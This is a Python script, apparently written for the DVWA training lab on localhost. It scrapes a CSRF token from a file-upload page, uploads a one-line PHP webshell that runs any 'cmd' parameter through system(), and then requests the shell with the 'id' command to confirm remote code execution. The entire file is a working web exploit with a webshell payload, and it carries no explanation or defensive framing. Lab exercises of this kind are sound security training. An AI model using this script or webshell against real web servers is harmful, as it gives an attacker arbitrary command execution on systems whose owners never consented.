
import requests
import re

s = requests.Session()
s.cookies.update({'PHPSESSID': '9f8c8our5hpn5aqrjdbg4k9er5', 'security': 'low'})

# First GET the upload page to grab CSRF token
upload_page_url = "http://localhost:28080/vulnerabilities/upload/"
r = s.get(upload_page_url)

# Extract CSRF token
token_match = re.search(r"name='user_token' value='([^']+)'", r.text)
if token_match:
    csrf_token = token_match.group(1)
    print(f"[*] Got CSRF token: {csrf_token}")
else:
    print("[-] No CSRF token found, proceeding without it")
    csrf_token = None

# Create a simple PHP webshell
webshell_content = """<?php system($_REQUEST['cmd']); ?>"""

# Prepare multipart form data
files = {
    'uploaded': ('shell.php', webshell_content, 'application/x-php')
}

data = {
    'MAX_FILE_SIZE': '100000',
    'Upload': 'Upload'
}

# Add CSRF token if found
if csrf_token:
    data['user_token'] = csrf_token

print("[*] Uploading webshell...")
r = s.post(upload_page_url, files=files, data=data)

# Check response
if "successfully uploaded" in r.text.lower():
    print("[+] SUCCESS: Webshell uploaded!")
    
    # Test the shell
    shell_url = "http://localhost:28080/hackable/uploads/shell.php?cmd=id"
    print(f"\n[*] Testing webshell at: {shell_url}")
    
    r2 = s.get(shell_url)
    if r2.status_code == 200 and "uid=" in r2.text:
        print("[+] Webshell is active! Remote code execution confirmed.")
        print(f"\n[*] Command output:\n{r2.text}")
    else:
        print(f"[-] Shell not accessible (status: {r2.status_code})")
else:
    print("[-] Upload failed")
    # Show relevant part of response
    pre_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    if pre_match:
        print(f"\n[*] Server response:\n{pre_match.group(1)}")
    else:
        print("\n[*] Response snippet:")
        print(r.text[1500:2000])

